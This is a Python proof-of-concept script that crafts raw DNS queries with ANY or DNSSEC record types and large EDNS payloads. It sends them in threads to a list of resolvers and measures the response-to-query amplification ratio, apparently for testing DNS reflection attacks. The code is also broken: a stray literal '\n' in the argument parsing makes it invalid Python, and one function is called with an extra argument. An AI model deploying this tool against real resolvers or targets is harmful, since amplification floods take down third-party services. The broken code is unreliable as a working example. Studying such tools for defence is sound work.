import socket
import threading
import time
import argparse

QTYPE_MAP = {
    'A': 1,
    'AAAA': 28,
    'ANY': 255,
    'DNSKEY': 48,
    'DS': 43,
    'TXT': 16,
}

def get_resolvers_from_file(file_path):
    with open(file_path, 'r') as file:
        resolvers = [line.strip() for line in file.readlines()]
    return resolvers

def get_address_port():
    address = input("Enter server address: ")
    port = int(input("Enter server port: "))
    return address, port

def send_dns_query(domain_name, dns_server_address, dns_server_port, interval, verbose, qtype_name='A', edns_payload=0, dnssec_do=False, measure=False, timeout=1.0):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (dns_server_address, dns_server_port)

    try:
        client_socket.settimeout(timeout)
        identifier = 0x1337.to_bytes(2, byteorder='big')
        flags = (0x0100).to_bytes(2, byteorder='big')
        qdcount = (1).to_bytes(2, byteorder='big')
        qtype_value = QTYPE_MAP.get(qtype_name.upper(), 1)
        qtype = (qtype_value).to_bytes(2, byteorder='big')
        qclass = (1).to_bytes(2, byteorder='big')

        labels = domain_name.split('.')
        qname = b''.join(len(label).to_bytes(1, byteorder='big') + label.encode() for label in labels) + b'\x00'

        ancount = (0).to_bytes(2, byteorder='big')
        nscount = (0).to_bytes(2, byteorder='big')
        arcount = (1).to_bytes(2, byteorder='big') if edns_payload > 0 else (0).to_bytes(2, byteorder='big')
        dns_query = identifier + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass

        if edns_payload > 0:
            opt_name = b'\x00'
            opt_type = (41).to_bytes(2, byteorder='big')
            opt_udp_payload = (edns_payload).to_bytes(2, byteorder='big')
            ext_rcode = (0).to_bytes(1, byteorder='big')
            version = (0).to_bytes(1, byteorder='big')
            flags_do = (0x8000 if dnssec_do else 0).to_bytes(2, byteorder='big')
            rdata_len = (0).to_bytes(2, byteorder='big')
            opt_record = opt_name + opt_type + opt_udp_payload + ext_rcode + version + flags_do + rdata_len
            dns_query += opt_record

        if verbose:
            print(f"Sending DNS query for {domain_name} to {dns_server_address}:{dns_server_port}")
            if measure:
                print(f"Query size: {len(dns_query)} bytes")

        client_socket.sendto(dns_query, server_address)

        try:
            data, _ = client_socket.recvfrom(1024)
            if verbose:
                print(f"Received DNS Response for {domain_name}:\n", data.hex())
                if measure:
                    print(f"Response size: {len(data)} bytes, ratio: {round(len(data)/len(dns_query), 2)}x")
        except socket.timeout:
            if verbose:
                print(f"Timeout waiting for DNS response for {domain_name}")

    finally:
        client_socket.close()

def send_queries_through_resolvers(domain, resolvers, server_port, num_queries, interval, verbose, qtype_name='A', edns_payload=0, dnssec_do=False, measure=False):
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            thread = threading.Thread(target=send_dns_query, args=(domain, resolver, server_port, interval, verbose, qtype_name, edns_payload, dnssec_do, measure))
            threads.append(thread)
            thread.start()
            time.sleep(interval)

    for thread in threads:
        thread.join()

def display_banner():
    print('''
â–ˆâ–€â–„â–€â–ˆ â–„â–ˆâ–ˆâ–ˆâ–„     â–„â–„â–„â–„â–€ â–„â–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–„â–„â–„â–„ â–ˆâ–ˆ   â–„â–ˆ    â–„   
â–ˆ â–ˆ â–ˆ â–ˆâ–€   â–€ â–€â–€â–€ â–ˆ    â–ˆâ–€   â–€  â–ˆ   â–ˆ â–ˆ  â–„â–€ â–ˆ â–ˆ  â–ˆâ–ˆ     â–ˆ  
â–ˆ â–„ â–ˆ â–ˆâ–ˆâ–„â–„       â–ˆ    â–ˆâ–ˆâ–„â–„    â–ˆ   â–ˆ â–ˆâ–€â–€â–Œ  â–ˆâ–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆ 
â–ˆ   â–ˆ â–ˆâ–„   â–„â–€   â–ˆ     â–ˆâ–„   â–„â–€ â–€â–ˆâ–ˆâ–ˆâ–ˆ â–ˆ  â–ˆ  â–ˆ  â–ˆ â–â–ˆ â–ˆ â–ˆ  â–ˆ 
   â–ˆ  â–€â–ˆâ–ˆâ–ˆâ–€    â–€      â–€â–ˆâ–ˆâ–ˆâ–€           â–ˆ      â–ˆ  â– â–ˆ  â–ˆ â–ˆ 
  â–€                                  â–€      â–ˆ     â–ˆ   â–ˆâ–ˆ 
                                           â–€  Author: r3vskd
                                              Warning: It was created for educational purposes. Please don't misuse it for illegal activities.         
''')
    print("Usage:")
    print(" $python ./poc.py -f resolvers.txt -d domain.com -s xxx.xxx.xxx.xxx -p 53 -q 4 -i 1\n")
    print("Options:")
    print("  -f or --file             DNS Resolvers txt file")
    print("  -d or --domain           Set the domain name to query")
    print("  -s or --server_address   Set the dns server address")
    print("  -p or --port             Set the server port")
    print("  -q or --num_queries      Set the number of queries to send (Default: 1)")
    print("  -i or --interval         Set the interval between queries in seconds (Default: 1 second)")
    print("  -v or --verbose          Enable verbose mode (optional)\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DNS query sender')
    parser.add_argument('-d', '--domain', type=str, help='Domain name to query')
    parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
    parser.add_argument('-s', '--server_address', type=str, help='DNS server address')
    parser.add_argument('-p', '--port', type=int, help='DNS server port')
    parser.add_argument('-q', '--num_queries', type=int, default=1, help='Number of queries to send')
    parser.add_argument('-i', '--interval', type=float, default=1.0, help='Interval between queries in seconds')\n    parser.add_argument('--timeout', type=float, default=1.0, help='Socket timeout in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    parser.add_argument('--qtype', type=str, default='A', help='DNS query type')
    parser.add_argument('--edns_payload', type=int, default=0, help='EDNS UDP payload size')
    parser.add_argument('--dnssec_do', action='store_true', help='Enable DNSSEC DO bit')
    parser.add_argument('--measure', action='store_true', help='Show query/response sizes and ratio')

    args = parser.parse_args()

    if not args.domain or not args.port:
        display_banner()
    else:
        if args.file:
            resolvers = get_resolvers_from_file(args.file)
            send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.verbose, args.qtype, args.edns_payload, args.dnssec_do, args.measure, args.timeout)
        if args.server_address:
            send_dns_query(args.domain, args.server_address, args.port, args.interval, args.verbose, args.qtype, args.edns_payload, args.dnssec_do, args.measure, args.timeout)
        if not args.file and not args.server_address:
            print("Please provide a file containing DNS resolver addresses using -f/--file or specify the server using -s/--server_address.")


